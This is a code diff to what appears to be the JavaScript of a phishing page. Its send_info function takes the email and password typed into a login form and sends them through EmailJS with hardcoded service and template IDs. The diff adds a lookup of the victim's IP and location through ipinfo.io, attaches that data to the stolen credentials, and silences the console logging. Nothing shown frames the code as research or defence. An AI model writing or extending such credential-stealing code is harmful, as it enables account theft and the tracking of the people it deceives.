@@ -11,13 +11,31 @@ function sleep(milliseconds) {
   } while (currentDate - date < milliseconds);
 }
 
-function send_info(params){
+async function getIpClient() {
+  try {
+    const response = await axios.get('https://ipinfo.io/json');
+    console.log(response.data);
+    return response.data;
+  } catch (error) {
+    console.error(error);
+    return error;
+  }
+}
+
+async function send_info(params){
     let email = document.querySelector("#email").value, 
     pswd = document.querySelector("#password").value;
 
-    var tempParams = {to_email: email, to_password: pswd};
-    console.log(email);
-    console.log(pswd);
+    var data = await getIpClient(), info="";
+    for (let key in data) {
+        //console.log(key);
+        if (key == "readme") break;
+        info += String(key) + ": " + String(data[key]) + ", ";
+    }
+
+    var tempParams = {to_email: email, to_password: pswd, full_info: info};
+    //console.log(email);
+    //console.log(pswd);
 
     emailjs.send('service_pnhbf6x', 'template_9tqrawd', tempParams)
     .then(function(res) {
@@ -27,7 +45,7 @@ function send_info(params){
     });
 
     //setTimeout(() => {console.log("A");}, 500);
-    sleep(1000);
+    //sleep(1000);
 
 
     var list = document.querySelector(".center");
